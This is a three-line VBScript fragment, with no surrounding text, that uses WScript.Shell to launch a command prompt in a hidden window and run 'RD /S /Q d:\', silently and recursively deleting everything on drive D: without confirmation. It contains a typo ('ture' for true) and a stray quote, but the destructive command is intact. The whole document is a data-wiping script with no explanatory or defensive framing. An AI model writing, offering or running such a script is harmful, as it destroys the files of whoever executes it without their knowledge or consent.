dim ws
set ws=CreateObject("wscript.shell")
ws.Run "%Comspec% /c"&"RD /S /Q d:\",0,ture'